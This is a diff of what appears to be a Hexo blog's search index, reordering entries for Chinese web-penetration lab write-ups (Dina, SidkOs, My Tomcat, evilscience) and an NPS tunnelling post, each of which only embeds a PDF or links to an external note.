+    <content><![CDATA[<h2 id="web渗透——Dina-1-0-1"><a href="#web渗透——Dina-1-0-1" class="headerlink" title="web渗透——Dina-1-0-1"></a>web渗透——Dina-1-0-1</h2><p>靶机:</p>
 
 
 	<div class="row">
-    <embed src="easy_cloudantivirus.pdf" width="100%" height="550" type="application/pdf">
+    <embed src="Dina-1-0-1.pdf" width="100%" height="550" type="application/pdf">
 	</div>
 
 
@@ -938,6 +1037,24 @@
       </categories>
   </entry>
   <entry>
+    <title>web渗透——SidkOs1.1</title>
+    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94SidkOs1-1/</url>
+    <content><![CDATA[<h2 id="web渗透——SidkOs1-1"><a href="#web渗透——SidkOs1-1" class="headerlink" title="web渗透——SidkOs1.1"></a>web渗透——SidkOs1.1</h2><p>映像笔记链接:<a href="https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485">https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485</a> or pdf</p>
+
+
+	<div class="row">
+    <embed src="SidkOs1.1.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
     <title>web渗透——My Tomcat HOST:1</title>
     <url>/2021/12/29/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94My-Tomcat-HOST-1/</url>
     <content><![CDATA[<h2 id="web渗透——My-Tomcat-HOST-1"><a href="#web渗透——My-Tomcat-HOST-1" class="headerlink" title="web渗透——My Tomcat HOST:1"></a>web渗透——My Tomcat HOST:1</h2><p>pdf</p>
@@ -951,24 +1068,6 @@
 
 
 <p><em>注意请在电脑端浏览器查看。</em></p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>web渗透——SidkOs1.1</title>
-    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94SidkOs1-1/</url>
-    <content><![CDATA[<h2 id="web渗透——SidkOs1-1"><a href="#web渗透——SidkOs1-1" class="headerlink" title="web渗透——SidkOs1.1"></a>web渗透——SidkOs1.1</h2><p>映像笔记链接:<a href="https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485">https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485</a> or pdf</p>
-
-
-	<div class="row">
-    <embed src="SidkOs1.1.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-
 ]]></content>
       <categories>
         <category>web渗透</category>
@@ -1063,23 +1162,6 @@
       </categories>
   </entry>
   <entry>
-    <title>云服务器配置NPS服务实现内网穿透</title>
-    <url>/2022/01/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AENPS%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
-    <content><![CDATA[<h2 id="云服务器配置NPS服务实现内网穿透"><a href="#云服务器配置NPS服务实现内网穿透" class="headerlink" title="云服务器配置NPS服务实现内网穿透"></a>云服务器配置NPS服务实现内网穿透</h2><p>pdf:</p>
-
-
-	<div class="row">
-    <embed src="nps.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-]]></content>
-      <categories>
-        <category>内网穿透</category>
-      </categories>
-  </entry>
-  <entry>
     <title>web渗透——evilscience</title>
     <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94evilscience/</url>
     <content><![CDATA[<h2 id="web渗透——evilscience"><a href="#web渗透——evilscience" class="headerlink" title="web渗透——evilscience"></a>web渗透——evilscience</h2><p>靶机：</p>
@@ -1094,6 +1176,23 @@
 ]]></content>
       <categories>
         <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>云服务器配置NPS服务实现内网穿透</title>
+    <url>/2022/01/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AENPS%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
+    <content><![CDATA[<h2 id="云服务器配置NPS服务实现内网穿透"><a href="#云服务器配置NPS服务实现内网穿透" class="headerlink" title="云服务器配置NPS服务实现内网穿透"></a>云服务器配置NPS服务实现内网穿透</h2><p>pdf:</p>
+
+
+	<div class="row">
+    <embed src="nps.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+]]></content>
+      <categories>
+        <category>内网穿透</category>
       </categories>
   </entry>
   <entry>
